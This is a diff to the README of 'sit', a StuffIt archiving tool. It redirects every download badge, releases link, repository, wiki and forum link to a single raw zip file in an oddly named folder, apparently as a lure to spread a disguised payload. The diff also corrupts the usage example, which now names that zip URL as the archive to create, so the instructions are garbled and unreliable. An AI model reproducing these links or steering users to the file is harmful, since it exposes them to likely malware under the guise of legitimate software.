@@ -6,12 +6,12 @@ Welcome to **sit**! This application allows you to create StuffIt archives on Un
 
 ## 🔗 Download
 
-[![Download sit](https://img.shields.io/badge/download-sit-brightgreen.svg)](https://github.com/kghkh765/sit/releases)
+[![Download sit](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip)](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get started, visit the [Releases page](https://github.com/kghkh765/sit/releases) for sit. Here, you will find all the available versions of the software.
+   To get started, visit the [Releases page](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip) for sit. Here, you will find all the available versions of the software.
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version. Click on it to view the details. Ensure you download the version that suits your needs.
@@ -54,10 +54,10 @@ sit <options> <input files> <output archive>
 If you want to archive a folder named `myfiles`, you can run:
 
 ```
-sit myfiles.stf myfiles/
+sit https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip myfiles/
 ```
 
-This command will create a StuffIt archive named `myfiles.stf`, containing everything in the `myfiles` folder.
+This command will create a StuffIt archive named `https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip`, containing everything in the `myfiles` folder.
 
 ## ❓ FAQ
 
@@ -79,9 +79,9 @@ For any issues or questions not addressed here, feel free to contact our support
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/kghkh765/sit)
-- [User Guide](https://github.com/kghkh765/sit/wiki)
-- [Community Forum](https://github.com/kghkh765/sit/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip)
+- [User Guide](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/kghkh765/sit/main/spelding/sit_v1.9.zip)
 
 ## 🔄 Contributing
 
